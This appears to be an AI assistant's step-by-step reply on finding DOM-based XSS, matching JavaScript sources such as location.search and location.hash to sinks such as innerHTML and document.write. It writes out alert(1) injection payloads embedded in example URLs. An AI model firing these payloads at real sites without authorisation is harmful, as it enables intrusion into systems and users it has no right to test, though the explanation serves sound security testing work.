Absolutely! Let’s break it down **very simply**, step by step.

## 🧠 Situation:

You found suspicious keywords like `innerHTML`, `document.write`, `eval`, etc. in a `.js` file.

Now you want to know:  
**“Which URL should I test for XSS?”**

---

## ✅ Simple Step-by-Step Guide to Find the Right Link to Test XSS

---

### 🔍 1. **Look at the input source in the JS code**

Focus on what part of the URL the JavaScript is using.

|If the JS uses this...|You control it using...|
|---|---|
|`location.search`|Query string → `?name=...`|
|`location.hash`|Hash value → `#...`|
|`location.href` or `URL`|Whole URL (path, query, hash)|
|`document.referrer`|Referrer header (via redirect)|
|`window.name`|`window.name = "..."` via another tab|

---

### 👀 2. **Read the exact JS line (example)**

```js
let user = new URLSearchParams(location.search).get("msg");
document.getElementById("output").innerHTML = user;
```

💡This says:

- It’s taking input from `?msg=...` in the URL (query param)
- It is inserting it into the page using `.innerHTML` (dangerous sink)

✅ So you test:

```
https://example.com/page.html?msg=<img src=x onerror=alert(1)>
```

---

### 🔎 3. **If you see this in code...**

```js
document.write(location.hash);
```

You test:

```
https://example.com/#<script>alert(1)</script>
```

Because `location.hash` means it will use the part after `#` in the URL.

---

### 🛠 4. **Still unsure? Use this trick:**

Paste this into the browser console **on that page**:

```js
console.log(location.href);
console.log(location.search);
console.log(location.hash);
```

That tells you **what the current page can access from your URL**, so you know where to inject.

---

### 🔁 5. **Try payloads in different parts of URL**

When unsure, try these:

```
https://site.com/page?test=<img src=x onerror=alert(1)>
https://site.com/page#<svg onload=alert(1)>
https://site.com/<script>alert(1)</script>
```

Then observe the result in browser console and page output.

---

## ✅ Final Tip: Match Source → Sink

|JS Source Found|Where to inject in the URL|
|---|---|
|`location.search`|`?param=PAYLOAD`|
|`location.hash`|`#PAYLOAD`|
|`location.href`|Anywhere in the URL|
|`document.referrer`|Use a fake redirect to come from another page|
|`window.name`|Use JS in console: `window.name = "<payload>"`|
